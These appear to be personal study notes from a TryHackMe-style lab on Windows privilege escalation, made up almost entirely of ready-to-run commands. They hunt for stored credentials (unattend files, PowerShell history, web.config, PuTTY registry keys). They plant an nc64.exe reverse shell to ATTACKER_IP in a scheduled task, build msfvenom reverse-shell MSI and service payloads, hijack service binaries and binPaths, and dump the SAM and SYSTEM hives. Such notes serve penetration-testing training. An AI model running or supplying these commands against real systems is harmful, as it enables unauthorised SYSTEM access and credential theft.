# Windows Privilege Escalation

Notes
```powershell
type = cat
```

## Unattended Windows Installations

-   `C:\Unattend.xml`
-   `C:\Windows\Panther\Unattend.xml`
-   `C:\Windows\Panther\Unattend\Unattend.xml`
-   `C:\Windows\system32\sysprep.inf`
-   `C:\Windows\system32\sysprep\sysprep.xml`

```powershell
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Powershell History

```CMD 
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`

## Saved Windows Credentials

```powershell
cmdkey /list
```

```powershell
runas /savecred /user:admin cmd.exe
```

## IIS Configuration

-   `C:\inetpub\wwwroot\web.config`
-   `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

Here is a quick way to find database connection strings on the file:

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

```powershell
type C:\inetpub\wwwroot\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY

To retrieve the stored proxy credentials, you can search under the following registry key for Proxy Password with the following command:

```powershell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

## Scheduled Tasks

Task
```powershell
C:\> schtasks /query /tn vulntask /fo list /v
```

File Permissions
```powershell
C:\> icacls c:\tasks\schtask.bat
```

Reverse Shell
```powershell
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Run Task
```powershell
C:\> schtasks /run /tn vulntask
```

## AlwaysInstallElevated

Requires two registry values to be set
```powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

msfvenom
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.220.190 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Run the Metasploit Handler module configured accordingly

Run
```powershell
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Windows Services

**Service Control Manager** (SCM)
```powershell
C:\> sc qc apphostsvc
```

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`

## Insecure Permissions on Service Executable

Splinterware System Scheduler
```powershell
C:\> sc qc WindowsScheduler
```

```powershell
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

```shell
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4445 -f exe-service -o rev-svc.exe
```

Grant full permissions to the Everyone group
```powershell
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

Restart Service
```powershell
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
**Note:** PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

## Unquoted Service Paths

Proper quotation
```powershell
C:\> sc qc "vncserver"
```

Without proper quotation
```powershell
sc qc "disk sorter enterprise"
```

## Insecure Service Permissions

[Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) 
```powershell
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```

```powershell
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

## Windows Privileges

```powershell
whoami /priv
```

[Windows Privilege Constants (Authorization)](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
[Priv2Admin](https://github.com/gtworek/Priv2Admin)

## SeBackup / SeRestore

To backup the SAM and SYSTEM hashes, we can use the following commands:

```powershell
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
```

```powershell
C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
```

